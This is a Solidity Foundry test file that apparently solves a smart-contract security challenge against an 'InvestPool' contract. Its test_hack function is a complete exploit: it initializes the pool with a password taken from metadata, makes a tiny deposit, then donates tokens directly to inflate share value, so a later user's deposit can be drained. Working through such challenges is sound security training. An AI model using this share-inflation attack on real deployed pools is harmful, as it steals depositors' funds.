// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/poolToken.sol";
import "../src/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
				vm.startPrank(hacker);

        // solution

        // let's first initialize the Invest Pool with the 
        // password we found in metadata ipfs url
        // i.e, j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx

        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");

        // now as a hacker just deposit 1 token fairly using deposit()
        // function of Invest Pool
        pool.deposit(1);

        // now our balance in pool is 1 let's now transfer rest of the 
        // tokens to Invest Pool using ERC-20's transfer method on token
        token.transfer(address(pool), token.balanceOf(hacker));

        // now let's say in future some innocent user deposits
        // a million token to this pool
        vm.stopPrank();
        vm.startPrank(user);
        pool.deposit(1000000);
        vm.stopPrank();

        // we are now in position of withdrawing all these million tokens
        // along with our own tokens as explained in write up
        vm.startPrank(hacker);
        pool.withdrawAll();


				vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}